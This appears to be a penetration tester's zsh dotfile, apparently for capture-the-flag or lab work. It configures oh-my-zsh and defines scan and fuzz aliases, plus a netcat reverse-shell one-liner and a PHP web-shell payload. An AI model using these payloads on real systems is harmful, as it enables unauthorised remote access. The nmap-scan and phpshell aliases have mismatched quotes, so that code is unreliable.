export ZSH=$HOME/.oh-my-zsh

ZSH_THEME="raj"

plugins=(git
  zsh-autosuggestions  
  zsh-syntax-highlighting
  )

source $ZSH/oh-my-zsh.sh

zshcache_time="$(date +%s%N)"

autoload -Uz add-zsh-hook

# scans
alias scan='rustscan -a $IP -- -sC -sV'
alias nmap-scan='nmap -sC -sV -p- -Pn $IP -T4"
alias fuzz='dirsearch -u http://$IP'
alias revshell='echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc tun0 1337 >/tmp/f'
alias phpshell='echo <?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>'
